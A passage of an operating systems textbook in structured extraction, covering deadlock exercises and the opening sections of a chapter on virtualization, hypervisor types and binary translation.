state?\r\n27. One way to eliminate circular wait is to have rule saying that a process is entitled only\r\nto a single resource at any moment. Give an example to show that this restriction is\r\nunacceptable in many cases.\n468 DEADLOCKS CHAP. 6\r\n28. Tw o processes, A and B, each need three records, 1, 2, and 3, in a database. If A asks\r\nfor them in the order 1, 2, 3, and B asks for them in the same order, deadlock is not\r\npossible. However, if B asks for them in the order 3, 2, 1, then deadlock is possible.\r\nWith three resources, there are 3! or six possible combinations in which each process\r\ncan request them. What fraction of all the combinations is guaranteed to be deadlock\r\nfree?\r\n29. A distributed system using mailboxes has two IPC primitives, send and receive. The\r\nlatter primitive specifies a process to receive from and blocks if no message from that\r\nprocess is available, even though messages may be waiting from other processes.\r\nThere are no shared resources, but processes need to communicate frequently about\r\nother matters. Is deadlock possible? Discuss.\r\n30. In an electronic funds transfer system, there are hundreds of identical processes that\r\nwork as follows. Each process reads an input line specifying an amount of money, the\r\naccount to be credited, and the account to be debited. Then it locks both accounts and\r\ntransfers the money, releasing the locks when done. With many processes running in\r\nparallel, there is a very real danger that a process having locked account x will be\r\nunable to lock y because y has been locked by a process now waiting for x. Devise a\r\nscheme that avoids deadlocks. Do not release an account record until you have com\u0002pleted the transactions. (In other words, solutions that lock one account and then re\u0002lease it immediately if the other is locked are not allowed.)\r\n31. One way to prevent deadlocks is to eliminate the hold-and-wait condition. In the text it\r\nwas proposed that before asking for a new resource, a process must first release what\u0002ev er resources it already holds (assuming that is possible). However, doing so intro\u0002duces the danger that it may get the new resource but lose some of the existing ones to\r\ncompeting processes. Propose an improvement to this scheme.\r\n32. A computer science student assigned to work on deadlocks thinks of the following bril\u0002liant way to eliminate deadlocks. When a process requests a resource, it specifies a\r\ntime limit. If the process blocks because the resource is not available, a timer is start\u0002ed. If the time limit is exceeded, the process is released and allowed to run again. If\r\nyou were the professor, what grade would you give this proposal and why?\r\n33. Main memory units are preempted in swapping and virtual memory systems. The\r\nprocessor is preempted in time-sharing environments. Do you think that these preemp\u0002tion methods were developed to handle resource deadlock or for other purposes? How\r\nhigh is their overhead?\r\n34. Explain the differences between deadlock, livelock, and starvation.\r\n35. Assume two processes are issuing a seek command to reposition the mechanism to ac\u0002cess the disk and enable a read command. Each process is interrupted before executing\r\nits read, and discovers that the other has moved the disk arm. Each then reissues the\r\nseek command, but is again interrupted by the other. This sequence continually repeats.\r\nIs this a resource deadlock or a livelock? What methods would you recommend to\r\nhandle the anomaly?\r\n36. Local Area Networks utilize a media access method called CSMA/CD, in which sta\u0002tions sharing a bus can sense the medium and detect transmissions as well as collis-\nCHAP. 6 PROBLEMS 469\r\nions. In the Ethernet protocol, stations requesting the shared channel do not transmit\r\nframes if they sense the medium is busy. When such transmission has terminated,\r\nwaiting stations each transmit their frames. Two frames that are transmitted at the same\r\ntime will collide. If stations immediately and repeatedly retransmit after collision de\u0002tection, they will continue to collide indefinitely.\r\n(a) Is this a resource deadlock or a livelock?\r\n(b) Can you suggest a solution to this anomaly?\r\n(c) Can starvation occur with this scenario?\r\n37. A program contains an error in the order of cooperation and competition mechanisms,\r\nresulting in a consumer process locking a mutex (mutual exclusion semaphore) before\r\nit blocks on an empty buffer. The producer process blocks on the mutex before it can\r\nplace a value in the empty buffer and awaken the consumer. Thus, both processes are\r\nblocked forever, the producer waiting for the mutex to be unlocked and the consumer\r\nwaiting for a signal from the producer. Is this a resource deadlock or a communication\r\ndeadlock? Suggest methods for its control.\r\n38. Cinderella and the Prince are getting divorced. To divide their property, they hav e\r\nagreed on the following algorithm. Every morning, each one may send a letter to the\r\nother’s lawyer requesting one item of property. Since it takes a day for letters to be de\u0002livered, they hav e agreed that if both discover that they hav e requested the same item\r\non the same day, the next day they will send a letter canceling the request. Among\r\ntheir property is their dog, Woofer, Woofer’s doghouse, their canary, Tweeter, and\r\nTweeter’s cage. The animals love their houses, so it has been agreed that any division\r\nof property separating an animal from its house is invalid, requiring the whole division\r\nto start over from scratch. Both Cinderella and the Prince desperately want Woofer. So\r\nthat they can go on (separate) vacations, each spouse has programmed a personal com\u0002puter to handle the negotiation. When they come back from vacation, the computers\r\nare still negotiating. Why? Is deadlock possible? Is starvation possible? Discuss your\r\nanswer.\r\n39. A student majoring in anthropology and minoring in computer science has embarked\r\non a research project to see if African baboons can be taught about deadlocks. He\r\nlocates a deep canyon and fastens a rope across it, so the baboons can cross hand-over\u0002hand. Several baboons can cross at the same time, provided that they are all going in\r\nthe same direction. If eastward-moving and westward-moving baboons ever get onto\r\nthe rope at the same time, a deadlock will result (the baboons will get stuck in the mid\u0002dle) because it is impossible for one baboon to climb over another one while suspended\r\nover the canyon. If a baboon wants to cross the canyon, he must check to see that no\r\nother baboon is currently crossing in the opposite direction. Write a program using\r\nsemaphores that avoids deadlock. Do not worry about a series of eastward-moving\r\nbaboons holding up the westward-moving baboons indefinitely.\r\n40. Repeat the previous problem, but now avoid starvation. When a baboon that wants to\r\ncross to the east arrives at the rope and finds baboons crossing to the west, he waits\r\nuntil the rope is empty, but no more westward-moving baboons are allowed to start\r\nuntil at least one baboon has crossed the other way.\n470 DEADLOCKS CHAP. 6\r\n41. Program a simulation of the banker’s algorithm. Your program should cycle through\r\neach of the bank clients asking for a request and evaluating whether it is safe or unsafe.\r\nOutput a log of requests and decisions to a file.\r\n42. Write a program to implement the deadlock detection algorithm with multiple re\u0002sources of each type. Your program should read from a file the following inputs: the\r\nnumber of processes, the number of resource types, the number of resources of each\r\ntype in existence (vector E), the current allocation matrix C (first row, followed by the\r\nsecond row, and so on), the request matrix R (first row, followed by the second row,\r\nand so on). The output of your program should indicate whether there is a deadlock in\r\nthe system. In case there is, the program should print out the identities of all processes\r\nthat are deadlocked.\r\n43. Write a program that detects if there is a deadlock in the system by using a resource al\u0002location graph. Your program should read from a file the following inputs: the number\r\nof processes and the number of resources. For each process if should read four num\u0002bers: the number of resources it is currently holding, the IDs of resources it is holding,\r\nthe number of resources it is currently requesting, the IDs of resources it is requesting.\r\nThe output of program should indicate if there is a deadlock in the system. In case\r\nthere is, the program should print out the identities of all processes that are deadlocked.\r\n44. In certain countries, when two people meet they bow to each other. The protocol is that\r\none of them bows first and stays down until the other one bows. If they bow at the\r\nsame time, they will both stay bowed forever. Write a program that does not deadlock.\n7\r\nVIRTUALIZATION AND THE CLOUD\r\nIn some situations, an organization has a multicomputer but does not actually\r\nwant it. A common example is where a company has an email server, a Web server,\r\nan FTP server, some e-commerce servers, and others. These all run on different\r\ncomputers in the same equipment rack, all connected by a high-speed network, in\r\nother words, a multicomputer. One reason all these servers run on separate ma\u0002chines may be that one machine cannot handle the load, but another is reliability:\r\nmanagement simply does not trust the operating system to run 24 hours a day, 365\r\nor 366 days a year, with no failures. By putting each service on a separate com\u0002puter, if one of the servers crashes, at least the other ones are not affected. This is\r\ngood for security also. Even if some malevolent intruder manages to compromise\r\nthe Web server, he will not immediately have access to sensitive emails also—a\r\nproperty sometimes referred to as sandboxing. While isolation and fault tolerance\r\nare achieved this way, this solution is expensive and hard to manage because so\r\nmany machines are involved.\r\nMind you, these are just two out of many reasons for keeping separate ma\u0002chines. For instance, organizations often depend on more than one operating sys\u0002tem for their daily operations: a Web server on Linux, a mail server on Windows,\r\nan e-commerce server for customers running on OS X, and a few other services\r\nrunning on various flavors of UNIX. Again, this solution works, but cheap it is def\u0002initely not.\r\nWhat to do? A possible (and popular) solution is to use virtual machine tech\u0002nology, which sounds very hip and modern, but the idea is old, dating back to the\r\n471"
      }
    }
  },
  "7 VIRTUALIZATION AND THE CLOUD": {
    "page": 502,
    "children": {
      "7.1 HISTORY": {
        "page": 504,
        "content": "7.1 HISTORY 473\r\namount of critical state information about every process is kept in operating system\r\ntables, including information relating to open files, alarms, signal handlers, and\r\nmore. When migrating a virtual machine, all that have to be moved are the memory\r\nand disk images, since all the operating system tables move, too.\r\nAnother use for virtual machines is to run legacy applications on operating sys\u0002tems (or operating system versions) no longer supported or which do not work on\r\ncurrent hardware. These can run at the same time and on the same hardware as cur\u0002rent applications. In fact, the ability to run at the same time applications that use\r\ndifferent operating systems is a big argument in favor of virtual machines.\r\nYet another important use of virtual machines is for software development. A\r\nprogrammer who wants to make sure his software works on Windows 7, Windows\r\n8, several versions of Linux, FreeBSD, OpenBSD, NetBSD, and OS X, among\r\nother systems no longer has to get a dozen computers and install different operat\u0002ing systems on all of them. Instead, he merely creates a dozen virtual machines on\r\na single computer and installs a different operating system on each one. Of course,\r\nhe could have partitioned the hard disk and installed a different operating system in\r\neach partition, but that approach is more difficult. First of all, standard PCs sup\u0002port only four primary disk partitions, no matter how big the disk is. Second, al\u0002though a multiboot program could be installed in the boot block, it would be neces\u0002sary to reboot the computer to work on a new operating system. With virtual ma\u0002chines, all of them can run at once, since they are really just glorified processes.\r\nPerhaps the most important and buzzword-compliant use case for virtualization\r\nnowadays is found in the cloud. The key idea of a cloud is straightforward: out\u0002source your computation or storage needs to a well-managed data center run by a\r\ncompany specializing in this and staffed by experts in the area. Because the data\r\ncenter typically belongs to someone else, you will probably have to pay for the use\r\nof the resources, but at least you will not have to worry about the physical ma\u0002chines, power, cooling, and maintenance. Because of the isolation offered by virtu\u0002alizaton, cloud-providers can allow multiple clients, even competitors, to share a\r\nsingle physical machine. Each client gets a piece of the pie. At the risk of stretch\u0002ing the cloud metaphor, we mention that early critics maintained that the pie was\r\nonly in the sky and that real organizations would not want to put their sensitive\r\ndata and computations on someone else’s resources. By now, howev er, virtualized\r\nmachines in the cloud are used by countless organization for countless applica\u0002tions, and while it may not be for all organizations and all data, there is no doubt\r\nthat cloud computing has been a success.\r\n7.1 HISTORY\r\nWith all the hype surrounding virtualizaton in recent years, we sometimes for\u0002get that by Internet standards virtual machines are ancient. As early as the 1960s.\r\nIBM experimented with not just one but two independently developed hypervisors:\n474 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nSIMMON and CP-40. While CP-40 was a research project, it was reimplemented\r\nas CP-67 to form the control program of CP/CMS, a virtual machine operating\r\nsystem for the IBM System/360 Model 67. Later, it was reimplemented again and\r\nreleased as VM/370 for the System/370 series in 1972. The System/370 line was\r\nreplaced by IBM in the 1990s by the System/390. This was basically a name\r\nchange since the underlying architecture remained the same for reasons of back\u0002ward compatibility. Of course, the hardware technology was improved and the\r\nnewer machines were bigger and faster than the older ones, but as far as virtualiza\u0002tion was concerned, nothing changed. In 2000, IBM released the z-series, which\r\nsupported 64-bit virtual address spaces but was otherwise backward compatible\r\nwith the System/360. All of these systems supported virtualization decades before\r\nit became popular on the x86.\r\nIn 1974, two computer scientists at UCLA, Gerald Popek and Robert Gold\u0002berg, published a seminal paper (‘‘Formal Requirements for Virtualizable Third\r\nGeneration Architectures’’) that listed exactly what conditions a computer architec\u0002ture should satisfy in order to support virtualization efficiently (Popek and Gold\u0002berg, 1974). It is impossible to write a chapter on virtualization without referring\r\nto their work and terminology. Famously, the well-known x86 architecture that\r\nalso originated in the 1970s did not meet these requirements for decades. It was not\r\nthe only one. Nearly every architecture since the mainframe also failed the test.\r\nThe 1970s were very productive, seeing also the birth of UNIX, Ethernet, the\r\nCray-1, Microsoft, and Apple—so, despite what your parents may say, the 1970s\r\nwere not just about disco!\r\nIn fact, the real Disco revolution started in the 1990s, when researchers at Stan\u0002ford University developed a new hypervisor by that name and went on to found\r\nVMware, a virtualization giant that offers type 1 and type 2 hypervisors and now\r\nrakes in billions of dollars in revenue (Bugnion et al., 1997, Bugnion et al., 2012).\r\nIncidentally, the distinction between ‘‘type 1’’ and ‘‘type 2’’ hypervisors is also\r\nfrom the seventies (Goldberg, 1972). VMware introduced its first virtualization\r\nsolution for x86 in 1999. In its wake other products followed: Xen, KVM, Virtu\u0002alBox, Hyper-V, Parallels, and many others. It seems the time was right for virtu\u0002alization, even though the theory had been nailed down in 1974 and for decades\r\nIBM had been selling computers that supported—and heavily used—virtualization.\r\nIn 1999, it became popular among the masses, but new it was not, despite the mas\u0002sive attention it suddenly gained."
      },
      "7.2 REQUIREMENTS FOR VIRTUALIZATION": {
        "page": 505,
        "content": "7.2 REQUIREMENTS FOR VIRTUALIZATION\r\nIt is important that virtual machines act just like the real McCoy. In particular,\r\nit must be possible to boot them like real machines and install arbitrary operating\r\nsystems on them, just as can be done on the real hardware. It is the task of the\nSEC. 7.2 REQUIREMENTS FOR VIRTUALIZATION 475\r\nhypervisor to provide this illusion and to do it efficiently. Indeed, hypervisors\r\nshould score well in three dimensions:\r\n1. Safety: the hypervisor should have full control of the virtualized re\u0002sources.\r\n2. Fidelity: the behavior of a program on a virtual machine should be\r\nidentical to that of the same program running on bare hardware.\r\n3. Efficiency: much of the code in the virtual machine should run with\u0002out intervention by the hypervisor.\r\nAn unquestionably safe way to execute the instructions is to consider each in\u0002struction in turn in an interpreter (such as Bochs) and perform exactly what is\r\nneeded for that instruction. Some instructions can be executed directly, but not too\r\nmany. For instance, the interpreter may be able to execute an INC (increment) in\u0002struction simply as is, but instructions that are not safe to execute directly must be\r\nsimulated by the interpreter. For instance, we cannot really allow the guest operat\u0002ing system to disable interrupts for the entire machine or modify the page-table\r\nmappings. The trick is to make the operating system on top of the hypervisor think\r\nthat it has disabled interrupts, or changed the machine’s page mappings. We will\r\nsee how this is done later. For now, we just want to say that the interpreter may be\r\nsafe, and if carefully implemented, perhaps even hi-fi, but the performance sucks.\r\nTo also satisfy the performance criterion, we will see that VMMs try to execute\r\nmost of the code directly.\r\nNow let us turn to fidelity. Virtualization has long been a problem on the x86\r\narchitecture due to defects in the Intel 386 architecture that were slavishly carried\r\nforward into new CPUs for 20 years in the name of backward compatibility. In a\r\nnutshell, every CPU with kernel mode and user mode has a set of instructions that\r\nbehave differently when executed in kernel mode than when executed in user\r\nmode. These include instructions that do I/O, change the MMU settings, and so\r\non. Popek and Goldberg called these sensitive instructions. There is also a set of\r\ninstructions that cause a trap if executed in user mode. Popek and Goldberg called\r\nthese privileged instructions. Their paper stated for the first time that a machine\r\nis virtualizable only if the sensitive instructions are a subset of the privileged in\u0002structions. In simpler language, if you try to do something in user mode that you\r\nshould not be doing in user mode, the hardware should trap. Unlike the IBM/370,\r\nwhich had this property, Intel’s 386 did not. Quite a few sensitive 386 instructions\r\nwere ignored if executed in user mode or executed with different behavior. For ex\u0002ample, the POPF instruction replaces the flags register, which changes the bit that\r\nenables/disables interrupts. In user mode, this bit is simply not changed. As a\r\nconsequence, the 386 and its successors could not be virtualized, so they could not\r\nsupport a hypervisor directly.\r\nActually, the situation is even worse than sketched. In addition to the problems\r\nwith instructions that fail to trap in user mode, there are instructions that can read\n476 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nsensitive state in user mode without causing a trap. For example, on x86 proces\u0002sors prior to 2005, a program can determine whether it is running in user mode or\r\nkernel mode by reading its code-segment selector. An operating system that did\r\nthis and discovered that it was actually in user mode might make an incorrect de\u0002cision based on this information.\r\nThis problem was finally solved when Intel and AMD introduced virtualization\r\nin their CPUs starting in 2005 (Uhlig, 2005). On the Intel CPUs it is called VT\r\n(Virtualization Technology); on the AMD CPUs it is called SVM (Secure Vir\u0002tual Machine). We will use the term VT in a generic sense below. Both were\r\ninspired by the IBM VM/370 work, but they are slightly different. The basic idea\r\nis to create containers in which virtual machines can be run. When a guest operat\u0002ing system is started up in a container, it continues to run there until it causes an\r\nexception and traps to the hypervisor, for example, by executing an I/O instruction.\r\nThe set of operations that trap is controlled by a hardware bitmap set by the hyper\u0002visor. With these extensions the classical trap-and-emulate virtual machine ap\u0002proach becomes possible.\r\nThe astute reader may have noticed an apparent contradiction in the descrip\u0002tion thus far. On the one hand, we have said that x86 was not virtualizable until the\r\narchitecture extensions introduced in 2005. On the other hand, we saw that\r\nVMware launched its first x86 hypervisor in 1999. How can both be true at the\r\nsame time? The answer is that the hypervisors before 2005 did not really run the\r\noriginal guest operating system. Rather, they re wrote part of the code on the fly to\r\nreplace problematic instructions with safe code sequences that emulated the origi\u0002nal instruction. Suppose, for instance, that the guest operating system performed a\r\nprivileged I/O instruction, or modified one of the CPU’s privileged control regis\u0002ters (like the CR3 register which contains a pointer to the page directory). It is im\u0002portant that the consequences of such instructions are limited to this virtual ma\u0002chine and do not affect other virtual machines, or the hypervisor itself. Thus, an\r\nunsafe I/O instruction was replaced by a trap that, after a safety check, performed\r\nan equivalent instruction and returned the result. Since we are rewriting, we can\r\nuse the trick to replace instructions that are sensitive, but not privileged. Other in\u0002structions execute natively. The technique is known as binary translation; we will\r\ndiscuss it more detail in Sec. 7.4.\r\nThere is no need to rewrite all sensitive instructions. In particular, user proc\u0002esses on the guest can typically run without modification. If the instruction is non\u0002privileged but sensitive and behaves differently in user processes than in the kernel,\r\nthat is fine. We are running it in userland anyway. For sensitive instructions that are\r\nprivileged, we can resort to the classical trap-and-emulate, as usual. Of course, the\r\nVMM must ensure that it receives the corresponding traps. Typically, the VMM\r\nhas a module that executes in the kernel and redirects the traps to its own handlers.\r\nA different form of virtualization is known as paravirtualization. It is quite\r\ndifferent from full virtualization, because it never even aims to present a virtual\r\nmachine that looks just like the actual underlying hardware. Instead, it presents a\nSEC. 7.2 REQUIREMENTS FOR VIRTUALIZATION 477\r\nmachine-like software interface that explicitly exposes the fact that it is a virtu\u0002alized environment. For instance, it offers a set of hypercalls, which allow the\r\nguest to send explicit requests to the hypervisor (much as a system call offers ker\u0002nel services to applications). Guests use hypercalls for privileged sensitive opera\u0002tions like updating the page tables, but because they do it explicitly in cooperation\r\nwith the hypervisor, the overall system can be simpler and faster.\r\nIt should not come as a surprise that paravirtualization is nothing new either.\r\nIBM’s VM operating system has offered such a facility, albeit under a different\r\nname, since 1972. The idea was revived by the Denali (Whitaker et al., 2002) and\r\nXen (Barham et al., 2003) virtual machine monitors. Compared to full virtu\u0002alization, the drawback of paravirtualization is that the guest has to be aware of the\r\nvirtual machine API. Typically, this means it should be customized explicitly for\r\nthe hypervisor.\r\nBefore we delve more deeply into type 1 and type 2 hypervisors, it is important\r\nto mention that not all virtualization technology tries to trick the guest into believ\u0002ing that it has the entire system. Sometimes, the aim is simply to allow a process to\r\nrun that was originally written for a different operating system and/or architecture.\r\nWe therefore distinguish between full system virtualization and process-level vir\u0002tualization. While we focus on the former in the remainder of this chapter, proc\u0002ess-level virtualization technology is used in practice also. Well-known examples\r\ninclude the WINE compatibility layer that allows Windows application to run on\r\nPOSIX-compliant systems like Linux, BSD, and OS X, and the process-level ver\u0002sion of the QEMU emulator that allows applications for one architecture to run on\r\nanother."
      },
      "7.3 TYPE 1 AND TYPE 2 HYPERVISORS": {
        "page": 508,
        "content": "7.3 TYPE 1 AND TYPE 2 HYPERVISORS\r\nGoldberg (1972) distinguished between two approaches to virtualization. One\r\nkind of hypervisor, dubbed a type 1 hypervisor is illustrated in Fig. 7-1(a). Tech\u0002nically, it is like an operating system, since it is the only program running in the\r\nmost privileged mode. Its job is to support multiple copies of the actual hardware,\r\ncalled virtual machines, similar to the processes a normal operating system runs.\r\nIn contrast, a type 2 hypervisor, shown in Fig. 7-1(b), is a different kind of\r\nanimal. It is a program that relies on, say, Windows or Linux to allocate and\r\nschedule resources, very much like a regular process. Of course, the type 2 hyper\u0002visor still pretends to be a full computer with a CPU and various devices. Both\r\ntypes of hypervisor must execute the machine’s instruction set in a safe manner.\r\nFor instance, an operating system running on top of the hypervisor may change and\r\nev en mess up its own page tables, but not those of others.\r\nThe operating system running on top of the hypervisor in both cases is called\r\nthe guest operating system. For a type 2 hypervisor, the operating system running\r\non the hardware is called the host operating system. The first type 2 hypervisor\n478 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nType 1 hypervisor\r\nHardware\r\n(CPU, disk, network, interrupts, etc.)\r\nHardware\r\n(CPU, disk, network, interrupts, etc.)\r\nHost OS\r\n(e.g., Linux)\r\nControl\r\nDomain Windows Linux\r\nExcel Word Mplayer Emacs\r\nType 2 hypervisor\r\nGuest OS\r\n(e.g., Windows)\r\nGuest OS process\r\nHost OS\r\nprocess\r\nFigure 7-1. Location of type 1 and type 2 hypervisors.\r\non the x86 market was VMware Workstation (Bugnion et al., 2012). In this sec\u0002tion, we introduce the general idea. A study of VMware follows in Sec. 7.12.\r\nType 2 hypervisors, sometimes referred to as hosted hypervisors, depend for\r\nmuch of their functionality on a host operating system such as Windows, Linux, or\r\nOS X. When it starts for the first time, it acts like a newly booted computer and\r\nexpects to find a DVD, USB drive, or CD-ROM containing an operating system in\r\nthe drive. This time, however, the drive could be a virtual device. For instance, it is\r\npossible to store the image as an ISO file on the hard drive of the host and have the\r\nhypervisor pretend it is reading from a proper DVD drive. It then installs the oper\u0002ating system to its virtual disk (again really just a Windows, Linux, or OS X file)\r\nby running the installation program found on the DVD. Once the guest operating\r\nsystem is installed on the virtual disk, it can be booted and run.\r\nThe various categories of virtualization we have discussed are summarized in\r\nthe table of Fig. 7-2 for both type 1 and type 2 hypervisors. For each combination\r\nof hypervisor and kind of virtualization, some examples are given.\r\nVir tualizaton method Type 1 hyper visor Type 2 hyper visor\r\nVir tualization without HW support ESX Server 1.0 VMware Wor kstation 1\r\nParavir tualization Xen 1.0\r\nVir tualization with HW support vSphere, Xen, Hyper-V VMware Fusion, KVM, Parallels\r\nProcess virtualization Wine\r\nFigure 7-2. Examples of hypervisors. Type 1 hypervisors run on the bare metal\r\nwhereas type 2 hypervisors use the services of an existing host operating system."
      },
      "7.4 TECHNIQUES FOR EFFICIENT VIRTUALIZATION": {
        "page": 509,
        "children": {
          "7.4.1 Virtualizing the Unvirtualizable": {
            "page": 510,
            "content": "7.4.1 Virtualizing the Unvirtualizable\r\nBuilding a virtual machine system is relatively straightforward when VT is\r\navailable, but what did people do before that? For instance, VMware released a\r\nhypervisor well before the arrival of the virtualization extensions on the x86.\r\nAgain, the answer is that the software engineers who built such systems made\r\nclever use of binary translation and hardware features that did exist on the x86,\r\nsuch as the processor’s protection rings.\r\nFor many years, the x86 has supported four protection modes or rings. Ring 3\r\nis the least privileged. This is where normal user processes execute. In this ring,\r\nyou cannot execute privileged instructions. Ring 0 is the most privileged ring that\r\nallows the execution of any instruction. In normal operation, the kernel runs in\n480 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nring 0. The remaining two rings are not used by any current operating system. In\r\nother words, hypervisors were free to use them as they pleased. As shown in\r\nFig. 7-4, many virtualization solutions therefore kept the hypervisor in kernel mode\r\n(ring 0) and the applications in user mode (ring 3), but put the guest operating sys\u0002tem in a layer of intermediate privilege (ring 1). As a result, the kernel is privileged\r\nrelative to the user processes and any attempt to access kernel memory from a user\r\nprogram leads to an access violation. At the same time, the guest operating sys\u0002tem’s privileged instructions trap to the hypervisor. The hypervisor does some san\u0002ity checks and then performs the instructions on the guest’s behalf.\r\nType 1 hypervisor\r\nVirtual\r\nmachine\r\nGuest operating system\r\n(Rewrite binary prior to execution + emulate)\r\nring 0\r\nring 1\r\nring 2\r\nring 3\r\nHardware\r\nUser process\r\nFigure 7-4. The binary translator rewrites the guest operating system running in\r\nring 1, while the hypervisor runs in ring 0.\r\nAs for the sensitive instructions in the guest’s kernel code: the hypervisor\r\nmakes sure they no longer exist. To do so, it rewrites the code, one basic block at a\r\ntime. A basic block is a short, straight-line sequence of instructions that ends with\r\na branch. By definition, a basic block contains no jump, call, trap, return, or other\r\ninstruction that alters the flow of control, except for the very last instruction which\r\ndoes precisely that. Just prior to executing a basic block, the hypervisor first scans\r\nit to see if it contains sensitive instructions (in the Popek and Goldberg sense), and\r\nif so, replaces them with a call to a hypervisor procedure that handles them. The\r\nbranch on the last instruction is also replaced by a call into the hypervisor (to make\r\nsure it can repeat the procedure for the next basic block). Dynamic translation and\r\nemulation sound expensive, but typically are not. Translated blocks are cached, so\r\nno translation is needed in the future. Also, most code blocks do not contain sensi\u0002tive or privileged instructions and thus can executes natively. In particular, as long\r\nas the hypervisor configures the hardware carefully (as is done, for instance, by\r\nVMware), the binary translator can ignore all user processes; they execute in non\u0002privileged mode anyway.\r\nAfter a basic block has completed executing, control is returned to the hypervi\u0002sor, which then locates its successor. If the successor has already been translated,\nSEC. 7.4 TECHNIQUES FOR EFFICIENT VIRTUALIZATION 481\r\nit can be executed immediately. Otherwise, it is first translated, cached, then ex\u0002ecuted. Eventually, most of the program will be in the cache and run at close to\r\nfull speed. Various optimizations are used, for example, if a basic block ends by\r\njumping to (or calling) another one, the final instruction can be replaced by a jump\r\nor call directly to the translated basic block, eliminating all overhead associated\r\nwith finding the successor block. Again, there is no need to replace sensitive in\u0002structions in user programs; the hardware will just ignore them anyway.\r\nOn the other hand, it is common to perform binary translation on all the guest\r\noperating system code running in ring 1 and replace even the privileged sensitive\r\ninstructions that, in principle, could be made to trap also. The reason is that traps\r\nare very expensive and binary translation leads to better performance.\r\nSo far we have described a type 1 hypervisor. Although type 2 hypervisors are\r\nconceptually different from type 1 hypervisors, they use, by and large, the same\r\ntechniques. For instance, VMware ESX Server (a type 1 hypervisor first shipped in\r\n2001) used exactly the same binary translation as the first VMware Workstation (a\r\ntype 2 hypervisor released two years earlier).\r\nHowever, to run the guest code natively and use exactly the same techniques\r\nrequires the type 2 hypervisor to manipulate the hardware at the lowest level,\r\nwhich cannot be done from user space. For instance, it has to set the segment de\u0002scriptors to exactly the right value for the guest code. For faithful virtualization,\r\nthe guest operating system should also be tricked into thinking that it is the true\r\nand only king of the mountain with full control of all the machine’s resources and\r\nwith access to the entire address space (4 GB on 32-bit machines). When the king\r\nfinds another king (the host kernel) squatting in its address space, the king will not\r\nbe amused.\r\nUnfortunately, this is exactly what happens when the guest runs as a user proc\u0002ess on a regular operating system. For instance, in Linux a user process has access\r\nto just 3 GB of the 4-GB address space, as the remaining 1 GB is reserved for the\r\nkernel. Any access to the kernel memory leads to a trap. In principle, it is possible\r\nto take the trap and emulate the appropriate actions, but doing so is expensive and\r\ntypically requires installing the appropriate trap handler in the host kernel. Another\r\n(obvious) way to solve the two-kings problem, is to reconfigure the system to re\u0002move the host operating system and actually give the guest the entire address\r\nspace. However, doing so is clearly not possible from user space either.\r\nLikewise, the hypervisor needs to handle the interrupts to do the right thing,\r\nfor instance when the disk sends an interrupt or a page fault occurs. Also, if the\r\nhypervisor wants to use trap-and-emulate for privileged instructions, it needs to re\u0002ceive the traps. Again, installing trap/interrupt handlers in the kernel is not possible\r\nfor user processes.\r\nMost modern type 2 hypervisors therefore have a kernel module operating in\r\nring 0 that allows them to manipulate the hardware with privileged instructions. Of\r\ncourse, manipulating the hardware at the lowest level and giving the guest access\r\nto the full address space is all well and good, but at some point the hypervisor\n482 VIRTUALIZATION AND THE CLOUD CHAP. 7\r\nneeds to clean it up and restore the original processor context. Suppose, for\r\ninstance, that the guest is running when an interrupt arrives from an external de\u0002vice. Since a type 2 hypervisor depends on the host’s device drivers to handle the\r\ninterrupt, it needs to reconfigure the hardware completely to run the host operating\r\nsystem code. When the device driver runs, it finds everything just as it expected it\r\nto be. The hypervisor behaves just like teenagers throwing a party while their par\u0002ents are away. It is okay to rearrange the furniture completely, as long as they put it\r\nback exactly as they found it before the parents come home. Going from a hard\u0002ware configuration for the host kernel to a configuration for the guest operating\r\nsystem is known as a world switch. We will discuss it in detail when we discuss\r\nVMware in Sec. 7.12.\r\nIt should now be clear why these hypervisors work, even on unvirtualizable\r\nhardware: sensitive instructions in the guest kernel are replaced by calls to proce\u0002dures that emulate these instructions. No sensitive instructions issued by the guest\r\noperating system are ever executed directly by the true hardware. They are turned\r\ninto calls to the hypervisor, which then emulates them."
          },
          "7.4.2 The Cost of Virtualization": {
            "page": 513,
            "content": "7.4.2 The Cost of Virtualization\r\nOne might naively expect that CPUs with VT would greatly outperform soft\u0002ware techniques that resort to translation, but measurements show a mixed picture\r\n(Adams and Agesen, 2006). It turns out that the trap-and-emulate approach used\r\nby VT hardware generates a lot of traps, and traps are very expensive on modern\r\nhardware because they ruin CPU caches, TLBs, and branch prediction tables inter\u0002nal to the CPU. In contrast, when sensitive instructions are replaced by calls to\r\nhypervisor procedures within the executing process, none of this context-switching\r\noverhead is incurred. As Adams and Agesen show, depending on the workload,\r\nsometimes software beats hardware. For this reason, some type 1 (and type 2)\r\nhypervisors do binary translation for performance reasons, even though the soft\u0002ware will execute correctly without it.\r\nWith binary translation, the translated code itself may be either slower or faster\r\nthan the original code. Suppose, for instance, that the guest operating system dis\u0002ables hardware interrupts using the CLI instruction (‘‘clear interrupts’’). Depending\r\non the architecture, this instruction can be very slow, taking many tens of cycles on\r\ncertain CPUs with deep pipelines and out-of-order execution. It should be clear by\r\nnow that the guest’s wanting to turn off interrupts does not mean the hypervisor\r\nshould really turn them off and affect the entire machine. Thus, the hypervisor\r\nmust turn them off for the guest without really turning them off. To do so, it may\r\nkeep track of a dedicated IF (Interrupt Flag) in the virtual CPU data structure it\r\nmaintains for each guest (making sure the virtual machine does not get any inter\u0002rupts until the interrupts are turned off again). Every occurrence of CLI in the guest\r\nwill be replaced by something like ‘‘Vir tualCPU.IF = 0’’, which is a very cheap move\nSEC. 7.4 TECHNIQUES FOR EFFICIENT VIRTUALIZATION 483\r\ninstruction that may take as little as one to three cycles. Thus, the translated code is\r\nfaster. Still, with modern VT hardware, usually the hardware beats the software.\r\nOn the other hand, if the guest operating system modifies its page tables, this is\r\nvery costly. The problem is that each guest operating system on a virtual machine\r\nthinks it ‘‘owns’’ the machine and is at liberty to map any virtual page to any phys\u0002ical page in memory. Howev er, if one virtual machine wants to use a physical page\r\nthat is already in use by another virtual machine (or the hypervisor), something has\r\nto give. We will see in Section 7.6 that the solution is to add an extra level of page\r\ntables to map ‘‘guest physical pages’’ to the actual physical pages on the host. Not\r\nsurprisingly, mucking around with multiple levels of page tables is not cheap."
          }
        }
      },
      "7.5 ARE HYPERVISORS MICROKERNELS DONE RIGHT?": {
        "page": 514,
